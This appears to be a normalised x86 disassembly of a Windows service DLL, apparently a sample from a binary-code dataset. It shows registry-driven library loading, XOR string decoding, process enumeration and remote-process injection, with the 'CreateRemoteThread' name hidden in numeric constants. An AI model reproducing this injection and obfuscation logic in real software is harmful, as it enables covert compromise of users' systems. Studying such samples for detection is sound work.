push ebp
mov ebp esp
push ecx
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
push r--data
call [ LoadLibraryA@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax esi
leave
retn 0x4
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
and [ ebp + 0x8 ] 0x0
push 0x4
mov [ ebp - 0x4 ] eax
xor eax eax
pop ecx
mov dl [ ebp + eax - 0x1 ]
mov [ ebp + eax + 0xb ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
ServiceMain
push ebp
mov ebp esp
sub esp 0x354
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi 0x100
push esi
push [ eax ]
mov edi rw-data
push edi
mov [ ebp - 0x354 ] eax
call [ wcstombs@IAT ]
call sub_1000a61b
mov ebx [ memset@IAT ]
push 0x200
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call ebx
push 0x40
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call ebx
push edi
lea eax [ ebp - 0x144 ]
push r--data
push eax
mov [ ebp - 0x144 ] 0x0
call [ sprintf@IAT ]
add esp 0x30
lea eax [ ebp - 0x34c ]
push eax
push 0xf003f
push 0x0
lea eax [ ebp - 0x144 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
mov ebx [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x348 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x350 ]
push eax
push 0x0
push r--data
push [ ebp - 0x34c ]
mov [ ebp - 0x348 ] esi
call ebx
test eax eax
jne r-xdata
mov ebx [ LoadLibraryW@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x348 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x350 ]
push eax
push 0x0
push r--data
push [ ebp - 0x34c ]
call ebx
test eax eax
jne r-xdata
cmp [ ebp - 0x350 ] 0x3
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
test eax eax
je r-xdata
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x34c ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x350 ] 0x1
jne r-xdata
mov eax [ ebp - 0x348 ]
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
push [ rw-data ]
call esi
test eax eax
jne r-xdata
push [ rw-data ]
call eax
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp - 0x348 ]
mov [ ebp + eax - 0x144 ] 0x0
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov edx 0x8c
xor [ ebp + ecx * 2 - 0x144 ] dx
inc ecx
cmp ecx eax
jl r-xdata
push [ ebp - 0x354 ]
push [ ebp + 0x8 ]
call eax
jmp r-xdata
push r--data
push [ rw-data ]
call esi
test eax eax
jne r-xdata
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
jmp r-xdata
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call ebx
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x8
push r--data
push [ rw-data ]
call esi
test eax eax
je r-xdata
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
jmp r-xdata
push 0xffffffff
call [ Sleep@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
sub_1000e768
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0xcc8 ]
push eax
call [ esi + 0x4 ]
mov ebx eax
lea eax [ esi + 0xc88 ]
push eax
mov [ ebp - 0x18 ] ebx
call [ esi + 0x4 ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call [ esi ]
push edi
lea eax [ esi + 0xd08 ]
push eax
push ebx
call [ esi + 0x8 ]
mov edi eax
lea eax [ esi + 0xd28 ]
push eax
push ebx
call [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ esi + 0xd48 ]
push eax
push ebx
call [ esi + 0x8 ]
mov ebx eax
lea eax [ esi + 0xd68 ]
push eax
push [ ebp - 0x18 ]
call [ esi + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ esi + 0xd88 ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ esi + 0xda8 ]
push eax
push [ ebp - 0x14 ]
call [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
test edi edi
je r-xdata
push 0x0
call [ esi + 0x14 ]
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push [ ebp - 0x18 ]
call [ esi ]
pop edi
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test eax eax
je r-xdata
push 0x0
call edi
test eax eax
jne r-xdata
push 0x23
pop eax
dec eax
mov [ ebp + eax - 0x83 ] 0x0
jns r-xdata
xor edi edi
lea eax [ esi + 0xa40 ]
mov [ ebp - 0x84 ] 0x24
mov [ ebp - 0x70 ] 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] edi
cmp [ eax ] di
je r-xdata
lea eax [ esi + 0xc48 ]
cmp [ eax ] edi
je r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ esi + 0xc58 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
call [ ebp - 0x20 ]
cmp [ esi + 0xc4c ] di
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edi
je r-xdata
cmp [ esi + 0xc4e ] di
je r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x10840014
push eax
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ esi + 0xc58 ]
push ecx
push 0x7
push edi
push eax
call [ ebp - 0x1c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
lea ebx [ esi + 0xc68 ]
push ebx
push 0x0
lea eax [ esi + 0x18 ]
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp - 0xc ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x0
lea edi [ esi + 0x220 ]
push edi
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x0
lea edx [ esi + 0x428 ]
push edx
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push eax
call [ ecx + 0x40 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x54 ]
test eax eax
jne r-xdata
push 0x3b
pop eax
dec eax
mov [ ebp + eax - 0x5f ] 0x0
jns r-xdata
lea eax [ esi + 0x838 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov [ ebp - 0x60 ] 0x3c
mov [ ebp - 0x5c ] 0x40
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] 0x5
call [ ebp - 0x24 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ebx
xor edi edi
push edi
lea eax [ esi + 0x630 ]
push eax
call [ ebp - 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
push 0xffffffff
push [ ebp - 0x28 ]
call [ esi + 0x10 ]
push [ ebp - 0x28 ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push edi
push [ ebp - 0x10 ]
push eax
call [ ecx + 0x48 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x54 ]
sub_1000ea41
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x4 ] 0x0
push ebx
push esi
mov esi [ GetModuleHandleA@IAT ]
push edi
push r--data
push r--data
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov ebx eax
test ebx ebx
je r-xdata
push r--data
push r--data
call esi
push eax
call edi
and [ ebp - 0x8 ] 0x0
mov edi r--data
push edi
call [ strlen@IAT ]
pop ecx
mov [ ebp - 0xe ] ax
mov [ ebp - 0x10 ] ax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov [ ebp - 0xc ] edi
call esi
push eax
call ebx
test eax eax
js r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] eax
sub_1000eac2
push ebp
mov ebp esp
push ecx
push ebx
push esi
push [ ebp + 0x10 ]
xor ebx ebx
push 0x1000
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
push ebx
push edi
call [ VirtualAllocEx@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
push edi
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
push 0x8000
push ebx
push esi
push edi
call [ VirtualFreeEx@IAT ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push edi
call [ VirtualProtectEx@IAT ]
mov [ ebp - 0x4 ] esi
jmp r-xdata
sub_1000eb22
push ebp
mov ebp esp
sub esp 0x1000
and [ ebp - 0xc ] 0x0
push ebx
push esi
push edi
push 0x104
lea eax [ ebp - 0xffc ]
push eax
call [ GetWindowsDirectoryW@IAT ]
call sub_1000ea41
mov ebx [ GetModuleHandleA@IAT ]
push r--data
mov esi r--data
push esi
mov [ ebp - 0xdec ] eax
call ebx
mov edi [ GetProcAddress@IAT ]
push eax
call edi
push r--data
push esi
mov [ ebp - 0xdf4 ] eax
call ebx
push eax
call edi
push r--data
push esi
mov [ ebp - 0xdf0 ] eax
call ebx
push eax
call edi
push r--data
push esi
mov [ ebp - 0xde8 ] eax
call ebx
push eax
call edi
push r--data
push esi
mov [ ebp - 0xde4 ] eax
call ebx
push eax
call edi
mov esi [ wcscpy@IAT ]
mov [ ebp - 0xde0 ] eax
lea eax [ ebp - 0xddc ]
push rw-data
push eax
call esi
lea eax [ ebp - 0xbd4 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x9cc ]
push r--data
push eax
call esi
lea eax [ ebp - 0x7c4 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x5bc ]
push r--data
push eax
call esi
mov ax [ ebp - 0xffc ]
mov [ ebp - 0xbd4 ] ax
mov [ ebp - 0x7c4 ] ax
mov [ ebp - 0x5bc ] ax
lea eax [ ebp - 0x16c ]
push r--data
push eax
call esi
lea eax [ ebp - 0x12c ]
push r--data
push eax
call esi
mov edi [ strcpy@IAT ]
lea eax [ ebp - 0xec ]
push r--data
push eax
call edi
add esp 0x40
lea eax [ ebp - 0xcc ]
push r--data
push eax
call edi
lea eax [ ebp - 0xac ]
push r--data
push eax
call edi
lea eax [ ebp - 0x8c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x6c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x4c ]
push r--data
push eax
call edi
lea eax [ ebp - 0x3b4 ]
push r--data
push eax
call esi
mov esi r--data
lea edi [ ebp - 0x1ac ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x19c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x18c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
lea edi [ ebp - 0x17c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x4
lea eax [ ebp - 0xdf4 ]
movsd [ edi ] [ esi ]
mov edi [ ebp + 0x8 ]
push 0xdc8
push eax
call sub_1000eac2
push 0x20
push 0x1000
push sub_1000e768
mov [ ebp - 0x8 ] eax
call sub_1000eac2
xor esi esi
add esp 0x48
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] esi
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax esi
je r-xdata
mov edi [ htonl@IAT ]
push 0x43726561
call edi
push 0x74655265
mov [ ebp - 0x28 ] eax
call edi
push 0x6d6f7465
mov [ ebp - 0x24 ] eax
call edi
push 0x54687265
mov [ ebp - 0x20 ] eax
call edi
push 0x6164
mov [ ebp - 0x1c ] eax
call [ htons@IAT ]
movzx eax ax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x28 ]
push eax
push r--data
call ebx
push eax
call [ GetProcAddress@IAT ]
push esi
push esi
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push esi
push esi
push [ ebp + 0x8 ]
call eax
mov edi eax
cmp edi esi
je r-xdata
push 0xffffffff
push edi
call [ WaitForSingleObject@IAT ]
push edi
call [ CloseHandle@IAT ]
mov [ ebp - 0xc ] 0x1
sub_1000ed9e
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x4114
call sub_1000faf0
and [ esp + 0x4 ] 0x0
push ebx
push esi
push edi
lea eax [ esp + 0x14 ]
push eax
push 0x4000
lea eax [ esp + 0x128 ]
push eax
call [ EnumProcesses@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x14 ]
mov ecx r--data
shr edi 0x2
call sub_10004c18
and [ esp + 0xc ] 0x0
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
mov ebx [ _stricmp@IAT ]
mov eax [ esp + 0xc ]
mov eax [ esp + eax * 4 + 0x120 ]
test eax eax
je r-xdata
inc [ esp + 0xc ]
cmp [ esp + 0xc ] edi
jb r-xdata
push eax
push 0x0
push 0x1fffff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push 0x104
lea eax [ esp + 0x1c ]
push eax
push 0x0
push esi
call [ GetModuleBaseNameA@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea eax [ esp + 0x18 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_1000eb22
pop ecx
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
lea eax [ esp + 0x18 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_1000eebe
push ebp
mov ebp esp
sub esp 0x410
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp - 0x208 ]
push eax
call [ GetSystemDirectoryW@IAT ]
mov edi [ wcslen@IAT ]
lea eax [ ebp - 0x208 ]
push eax
call edi
cmp [ ebp + eax * 2 - 0x20a ] 0x5c
pop ecx
jne r-xdata
lea eax [ ebp - 0x208 ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x410 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
call edi
pop ecx
xor ecx ecx
mov [ ebp + eax * 2 - 0x20a ] cx
pop edi
pop esi
leave
retn
call sub_1000547b
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
push rw-data
push r--data
lea eax [ ebp - 0x410 ]
push esi
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x410 ]
push eax
call sub_1000537e
add esp 0x14
sub_1000ef85
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
xor eax eax
leave
retn
push esi
push 0x4
pop esi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push r--data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
xor esi esi
cmp [ ebp - 0xc ] esi
jne r-xdata
xor eax eax
inc eax
leave
retn
mov esi [ ebp - 0x10 ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp esi 0x5
pop esi
jne r-xdata
sub_1000f001
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_1000f11c
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x1
mov ecx [ _adjust_fdiv@IAT ]
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
xor eax eax
inc eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push r--data
push r--data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
jmp r-xdata
retn 0xc
jmp r-xdata
pop ecx
sub [ rw-data ] 0x4
cmp [ rw-data ] eax
jae r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
call ecx
mov eax [ rw-data ]
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
test esi esi
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000f11c
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_1000ae5a
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000f11c
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1000f11c
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1000f290
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ rw-data ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
js r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push esi
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov esi eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
pop esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
call [ GetErrorInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
sub_1000f312
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_1000f340
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call _CxxThrowException
sub_1000f380
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_1000f3c0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
add esp 0x4
sub_1000f401
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_1000eff2
push rw-data
call sub_1000f430
add esp 0x18
pop ebp
retn
sub_1000f430
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ eax ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] ecx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
push edi
mov ecx ebx
call sub_1000f6fb
jmp r-xdata
jmp r-xdata
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
lea edx [ ebx + ebx * 2 ]
mov ecx [ esi + edx * 4 + 0x14 ]
lea eax [ esi + edx * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1000f6b2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
call sub_1000f6e2
mov eax [ ebp + 0x14 ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
push edi
mov edx ebx
mov ecx eax
call sub_1000f6fb
mov eax [ ebp + 0x14 ]
push rw-data
call sub_1000f7b0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call [ ebp + 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1000f6c9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push 0x1
push ecx
call [ rw-data ]
add esp 0x8
sub_1000f5c0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1000f650
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1000f985
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1000f9a4
jmp r-xdata
sub_1000f650
